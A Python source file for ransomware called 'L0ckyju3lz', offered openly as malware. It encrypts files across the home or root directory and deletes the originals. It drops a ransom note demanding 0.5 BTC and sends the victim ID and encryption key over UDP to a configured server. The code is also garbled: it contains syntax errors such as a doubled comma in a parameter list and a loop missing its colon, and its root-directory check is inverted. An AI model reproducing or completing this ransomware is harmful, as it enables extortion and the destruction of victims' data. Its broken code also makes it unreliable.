import os
import shutil
import sys
import string
import random
import smtplib
import socket
import re
from os.path import expanduser
from cryptography.fernet import Fernet

class L0ckyju3lz():

    def __init__(self):

        # Locky
        self.key = None
        self.crypt = None
        self.file_ext_targets = ['txt']
        self.client_ID = None
        self.root_tree = None

        # Program Details
        self.author = "PiereLucas"
        self.version = "1.0"
        self.btc_wallet = ""
        self.server_mail = ""
        self.server_ip = None
        self.server_port = None

    def readme_txt(self):
        with open("readme" + self.rnd_str() + ".txt", 'wt') as f:
            rtxt = "Infected by L0ckyju3lz" + "\n" \
            + "Send 0.5 BTC to: " + self.btc_wallet + "\n" \
            + "Message us to get your decryption key: " + self.server_mail + "\n" \
            + "Your CLIENT ID: " + self.client_ID
            f.write(rtxt)
        return True

    def is_root_dir(self):
        if os.getuid() != 0:
            self.root_tree = "/"
        else:
            self.root_tree = expanduser("~/")

    def rnd_str(self, stringlen=32):
        letters = string.ascii_letters + string.digits
        return "".join(random.choice(letters) for i in range(stringlen))

    def gen_clientid(self):
        self.client_ID = self.rnd_str()
        return self.client_ID

    def gen_key(self):
        self.key = Fernet.generate_key()
        self.crypt = Fernet(self.key)
        return True

    def read_key(self):
        with open("*.lockyjuelz-key", 'rb') as f:
            self.key = f.read()
        self.crypt = Fernet(self.key)
        return True

    def pack_key(self):
        # generate key_dir, key_name and client_ID
        key_dir = self.gen_clientid()
        key_name = self.rnd_str() + ".lockyjuelz-key"
        key_path = key_dir + "/" + key_name
        # make key_dir
        os.mkdir(key_dir)
        # write key to file
        with open(key_path, 'wb') as f:
            f.write(self.key)
        # make archiv from key_dir
        raw_archiv_name = key_dir + "_pack"
        shutil.make_archive(raw_archiv_name, "zip", key_dir)
        archiv_name = raw_archiv_name + ".zip"
        # delete key_dir and key_name
        os.remove(key_path)
        os.rmdir(key_dir)
        return archiv_name

    def send_mail(self):
        try:
            pass
            return True
        except:
            return False

    def udp_client(self):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            message = self.client_ID + ";" + self.key
            s.sendto(message.encode(), (self.server_ip, self.server_port))
            s.close()
            return True
        except:
            return False

    def crypt_file(self, *,, mode=None):
        if mode == 'enc':
            # List all files in root_tree (~/ or /)
            for files in os.listdir(self.root_tree):
                try:
                    # Change Work-Dir to root_tree
                    os.chdir(self.root_tree)
                    # Read File
                    with open(files, 'rb') as f:
                        file_data = f.read()
                    # Encrypt data
                    encrypt_data = self.crypt.encrypt(file_data)
                    # Save encrypt data to file
                    with open(files + ".l0ckyju3lz", 'wb') as f:
                        f.write(encrypt_data)
                        # Remove old file
                        try:os.remove(files)
                        except: continue
                except: continue
            return True

        elif mode == 'dec':
            # List all files in root_tree (~/ or /)
            for files in os.listdir(self.root_tree)
                try:
                    # Change Work-Dir to root_tree
                    os.chdir(self.root_tree)
                    with open(files + ".l0ckyju3lz", 'rb') as f:
                        file_data = f.read()
                    decrypt_data = self.crypt.decrypt(file_data)
                    old_files = re.sub("\.l0ckyju3lz", "", files)
                    with open(old_files, 'wb') as f:
                        f.write(decrypt_data)
                        # Remove old file
                        try: os.remove(files)
                        except: continue
                except: continue
            return True

    def run(self):
        pass

if __name__ == "__main__":
    lj = L0ckyju3lz()
    lj.run()
